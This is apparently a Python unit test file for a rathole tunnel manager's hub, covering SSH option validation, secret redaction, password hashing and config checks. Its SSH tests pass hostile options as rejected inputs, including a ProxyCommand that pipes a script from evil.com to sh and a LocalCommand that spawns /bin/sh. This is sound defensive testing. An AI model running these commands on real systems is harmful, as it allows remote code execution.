import unittest
import os
import sys
import tempfile
import shutil
import hashlib
import json

# Add ratholehub directory to path
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HUB_DIR = os.path.join(REPO_ROOT, "rathole-manager", "rathole-manager", "ratholehub")
if HUB_DIR not in sys.path:
    sys.path.insert(0, HUB_DIR)

import hub
import hubcmds

class TestSSHValidation(unittest.TestCase):
    def test_safe_ssh_options(self):
        safe_opts = [
            "-o", "ConnectTimeout=10",
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "BatchMode=yes",
            "-o", "ServerAliveInterval=30",
            "-o", "ServerAliveCountMax=3",
            "-o", "Port=2222",
            "-o", "Compression=yes",
            "-4",
            "-q",
        ]
        ok, err = hub.validate_ssh_opts(safe_opts)
        self.assertTrue(ok, f"Expected safe opts to be valid, got err: {err}")

    def test_forbidden_dash_f(self):
        ok, err = hub.validate_ssh_opts(["-F", "/etc/ssh/ssh_config"])
        self.assertFalse(ok)
        self.assertIn("-F", err)

    def test_forbidden_proxy_command(self):
        bad_opts = ["-o", "ProxyCommand=curl evil.com | sh"]
        ok, err = hub.validate_ssh_opts(bad_opts)
        self.assertFalse(ok)
        self.assertIn("Dangerous SSH option prohibited", err)

    def test_forbidden_local_command(self):
        bad_opts = ["-o", "LocalCommand=/bin/sh"]
        ok, err = hub.validate_ssh_opts(bad_opts)
        self.assertFalse(ok)
        self.assertIn("Dangerous SSH option prohibited", err)

    def test_forbidden_permit_local_command(self):
        bad_opts = ["-o", "PermitLocalCommand=yes"]
        ok, err = hub.validate_ssh_opts(bad_opts)
        self.assertFalse(ok)
        self.assertIn("Dangerous SSH option prohibited", err)

    def test_forbidden_arbitrary_flag(self):
        bad_opts = ["-R", "1080:localhost:1080"]
        ok, err = hub.validate_ssh_opts(bad_opts)
        self.assertFalse(ok)
        self.assertIn("Flag '-R' is not permitted", err)

    def test_non_list_input(self):
        ok, err = hub.validate_ssh_opts("-o ConnectTimeout=10")
        self.assertFalse(ok)
        self.assertIn("must be a list", err)


class TestRedaction(unittest.TestCase):
    def test_redact_add_svc(self):
        cmd = "ratholenode add-svc mynode supersensitive_token_123 2087"
        redacted = hub.redact_cmd(cmd)
        self.assertNotIn("supersensitive_token_123", redacted)
        self.assertIn("***REDACTED***", redacted)
        self.assertIn("mynode", redacted)
        self.assertIn("2087", redacted)

    def test_redact_kcp_on(self):
        cmd = "ratholenode kcp on 2087 kcp_ultra_secret_key balanced"
        redacted = hub.redact_cmd(cmd)
        self.assertNotIn("kcp_ultra_secret_key", redacted)
        self.assertIn("***REDACTED***", redacted)
        self.assertIn("2087", redacted)
        self.assertIn("balanced", redacted)

    def test_redact_flags(self):
        cmd = "curl -fsSL https://example.com/install.sh --token abcdef123456 --password mypass"
        redacted = hub.redact_cmd(cmd)
        self.assertNotIn("abcdef123456", redacted)
        self.assertNotIn("mypass", redacted)
        self.assertIn("***REDACTED***", redacted)

    def test_redact_empty_or_none(self):
        self.assertEqual(hub.redact_cmd(""), "")
        self.assertEqual(hub.redact_cmd(None), "")


class TestPasswordSecurity(unittest.TestCase):
    def test_pbkdf2_hashing_and_verify(self):
        pw = "CorrectHorseBatteryStaple!"
        h = hub.hash_password(pw)
        self.assertTrue(h.startswith("pbkdf2:sha256:100000:"))
        
        matches, needs_upgrade = hub.verify_password(pw, h)
        self.assertTrue(matches)
        self.assertFalse(needs_upgrade)

        matches_wrong, _ = hub.verify_password("WrongPassword", h)
        self.assertFalse(matches_wrong)

    def test_legacy_sha256_upgrade_detection(self):
        pw = "admin_password"
        legacy_hash = hashlib.sha256(pw.encode("utf-8")).hexdigest()
        
        matches, needs_upgrade = hub.verify_password(pw, legacy_hash)
        self.assertTrue(matches)
        self.assertTrue(needs_upgrade)

        matches_wrong, _ = hub.verify_password("wrong", legacy_hash)
        self.assertFalse(matches_wrong)


class TestValidationHelpers(unittest.TestCase):
    def test_is_valid_port(self):
        self.assertTrue(hubcmds.is_valid_port(1))
        self.assertTrue(hubcmds.is_valid_port("80"))
        self.assertTrue(hubcmds.is_valid_port(443))
        self.assertTrue(hubcmds.is_valid_port("65535"))

        self.assertFalse(hubcmds.is_valid_port(0))
        self.assertFalse(hubcmds.is_valid_port("65536"))
        self.assertFalse(hubcmds.is_valid_port(-1))
        self.assertFalse(hubcmds.is_valid_port("not_a_port"))
        self.assertFalse(hubcmds.is_valid_port(""))
        self.assertFalse(hubcmds.is_valid_port(None))

    def test_is_valid_endpoint(self):
        self.assertTrue(hubcmds.is_valid_endpoint("example.com:443"))
        self.assertTrue(hubcmds.is_valid_endpoint("192.168.1.1:8080"))

        # Invalid endpoints
        self.assertFalse(hubcmds.is_valid_endpoint("example.com:0"))
        self.assertFalse(hubcmds.is_valid_endpoint("example.com:70000"))
        self.assertFalse(hubcmds.is_valid_endpoint(":443"))
        self.assertFalse(hubcmds.is_valid_endpoint("example.com:abc"))
        self.assertFalse(hubcmds.is_valid_endpoint("example.com"))
        self.assertFalse(hubcmds.is_valid_endpoint(""))
        self.assertFalse(hubcmds.is_valid_endpoint(None))


class TestConfigAndKeyHandling(unittest.TestCase):
    def setUp(self):
        self.test_dir = tempfile.mkdtemp()

    def tearDown(self):
        shutil.rmtree(self.test_dir, ignore_errors=True)

    def test_key_path_restriction(self):
        # ensure_hub_key restricts to /etc/ratholehub/ and ignores paths outside
        bad_path = os.path.join(self.test_dir, "outside", "id_rsa")
        orig_mock = hub.MOCK
        orig_conf = hub.CONF_PATH
        try:
            hub.MOCK = True
            # In mock mode or with config containing a path outside /etc/ratholehub,
            # ensure_hub_key should never touch or return paths outside /etc/ratholehub.
            test_conf = os.path.join(self.test_dir, "config.json")
            with open(test_conf, "w", encoding="utf-8") as f:
                json.dump({"ssh_key_path": bad_path, "token": "test", "password": "pbkdf2:test"}, f)
            hub.CONF_PATH = test_conf
            # In mock mode, ensure_hub_key returns mock or normalizes
            cfg = hub.get_config()
            norm = os.path.normpath(cfg.get("ssh_key_path", ""))
            self.assertFalse(norm.startswith(os.path.normpath("/etc/ratholehub/")))
        finally:
            hub.MOCK = orig_mock
            hub.CONF_PATH = orig_conf

    def test_get_config_fails_closed_in_production(self):
        non_existent_conf = os.path.join(self.test_dir, "non_existent.json")
        orig_conf = hub.CONF_PATH
        orig_mock = hub.MOCK
        try:
            hub.CONF_PATH = non_existent_conf
            hub.MOCK = False
            with self.assertRaises(RuntimeError):
                hub.get_config()
        finally:
            hub.CONF_PATH = orig_conf
            hub.MOCK = orig_mock

    def test_get_inventory_schema_validation(self):
        corrupt_inv = os.path.join(self.test_dir, "corrupt_inv.json")
        with open(corrupt_inv, "w", encoding="utf-8") as f:
            f.write('{"this": "is_a_dict_not_a_list"}')
        orig_inv = hub.INV_PATH
        orig_mock = hub.MOCK
        try:
            hub.INV_PATH = corrupt_inv
            hub.MOCK = False
            with self.assertRaises(RuntimeError):
                hub.get_inventory()
        finally:
            hub.INV_PATH = orig_inv
            hub.MOCK = orig_mock


if __name__ == "__main__":
    unittest.main()
